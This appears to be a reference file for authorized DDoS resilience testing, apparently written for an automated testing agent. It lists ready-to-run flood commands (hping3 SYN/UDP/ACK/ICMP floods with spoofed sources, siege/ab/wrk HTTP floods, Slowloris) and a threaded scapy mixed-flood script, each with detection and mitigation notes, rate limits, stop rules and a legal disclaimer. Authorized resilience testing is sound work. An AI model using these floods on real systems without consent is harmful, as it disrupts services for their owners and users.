# DDoS Stress Testing (Authorized Targets Only)

This reference provides techniques for authorized DDoS resilience testing against whitelisted targets. All activities are destructive and must be conducted with explicit authorization.

## Scope & Preconditions

- Target must be whitelisted via the "白名单" directive.
- All tests must be time-limited (max 300 seconds per test).
- Test rate should start low and scale gradually.
- Must stop immediately if non-target services are affected.

## Attack Types Reference

### TCP SYN Flood

**Description**: Sends SYN packets to the target without completing the handshake, exhausting connection table.

**Tool**: hping3, scapy

**Command**:
```bash
sudo hping3 -S -p 80 --flood --rand-source $TARGET_IP
```

**Detection**: Target responds with SYN-ACK, but ACK never arrives.

**Mitigation**: SYN cookies, SYN proxy, rate limiting.

### UDP Flood

**Description**: Sends UDP packets to random ports, saturating bandwidth and CPU.

**Tool**: hping3, scapy

**Command**:
```bash
sudo hping3 -2 -p 53 --flood --rand-source $TARGET_IP
```

**Detection**: High UDP traffic on random ports.

**Mitigation**: Rate limiting, UDP connection tracking.

### ACK Flood

**Description**: Sends ACK packets, bypassing stateful firewalls and consuming CPU.

**Tool**: hping3

**Command**:
```bash
sudo hping3 -A -p 80 --flood --rand-source $TARGET_IP
```

**Detection**: High ACK traffic without prior SYN.

**Mitigation**: Stateful firewall, connection tracking.

### ICMP Flood

**Description**: Sends ICMP echo requests (ping) to consume bandwidth.

**Tool**: hping3

**Command**:
```bash
sudo hping3 -1 --flood --rand-source $TARGET_IP
```

**Detection**: High ICMP traffic.

**Mitigation**: Block ICMP or rate limit.

### HTTP Flood (Layer 7)

**Description**: Sends HTTP requests to consume application resources.

**Tool**: siege, ab, wrk

**Command**:
```bash
# Siege
siege -c 100 -t 60s http://$TARGET/

# Apache Bench
ab -n 10000 -c 100 http://$TARGET/

# WRK
wrk -t 4 -c 100 -d 60s http://$TARGET/
```

**Detection**: High HTTP request rate, CPU usage, database connections.

**Mitigation**: WAF, rate limiting, caching.

### Slowloris

**Description**: Opens connections slowly, keeping them open to exhaust threads.

**Tool**: slowloris.py

**Command**:
```bash
python slowloris.py $TARGET_IP -p 80 -s 500
```

**Detection**: Many half-open connections.

**Mitigation**: Increase connection timeout, use reverse proxy.

### Mixed Flood (Scapy)

**Description**: Combines multiple attack types for maximum impact.

**Tool**: scapy

**Script**:

```python
from scapy.all import *
from threading import Thread

target = "TARGET_IP"
port = 80

def udp_flood():
    send(IP(dst=target)/UDP(dport=port)/Raw(load="X"*1024), loop=1, inter=0)

def syn_flood():
    send(IP(dst=target)/TCP(dport=port, flags="S"), loop=1, inter=0)

Thread(target=udp_flood).start()
Thread(target=syn_flood).start()
```

## Test Parameters Guidelines

| Parameter | Default | Maximum | Notes |
|-----------|---------|---------|-------|
| Rate (pps) | 1000 | 10000 | Start low, double gradually |
| Duration | 60s | 300s | Auto-stop at 300s |
| Threads | 1 | 4 | Increase for mixed attacks |
| Source IP | Random | Random | Use --rand-source with hping3 |

## Safety & Stopping Criteria

Stop immediately if:

- Non-target services become affected.
- Target becomes completely unavailable (test failure).
- Unintended network congestion occurs.
- User says "停止" (stop).

Auto-stop conditions:

- Duration exceeds 300 seconds.
- Rate exceeds 10000 pps.
- Target IP is not in whitelist.

## Evidence Collection

During DDoS testing, record:

- Attack parameters: type, rate, duration, timestamp.
- Target metrics: response time, error rate, connection resets.
- System metrics: CPU, memory, network utilization (if accessible).
- Start and end timestamps for each test.

## Reporting

Include DDoS test results in the final deliverable:

- Separate section in the HTML report.
- Per-test results table.
- Observations and impact summary.
- Recommendations for mitigation.

## Legal Disclaimer

DDoS testing can cause service disruption. Only perform on:

- Authorized targets (whitelist confirmed).
- Your own infrastructure.
- Lab environments.
- Targets with written consent.

Never perform on:

- Production services without explicit authorization.
- Third-party infrastructure.
- Public services not owned by you.
